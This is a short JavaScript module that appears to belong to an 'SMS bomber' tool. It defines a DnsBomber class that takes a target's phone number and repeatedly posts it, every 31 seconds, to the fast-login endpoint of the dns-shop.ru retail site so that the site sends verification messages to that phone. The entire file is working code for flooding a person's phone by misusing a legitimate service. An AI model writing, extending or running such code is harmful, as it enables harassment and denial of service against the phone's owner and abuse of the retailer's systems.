const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class DnsBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            "FastAuthorizationLoginLoadForm[login]": this.phone,
            "FastAuthorizationLoginLoadForm[token]": ''
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "dns";
    delay = 31000;
    url = `https://www.dns-shop.ru/auth/auth/fast-authorization/`;  
}
module.exports = DnsBomber;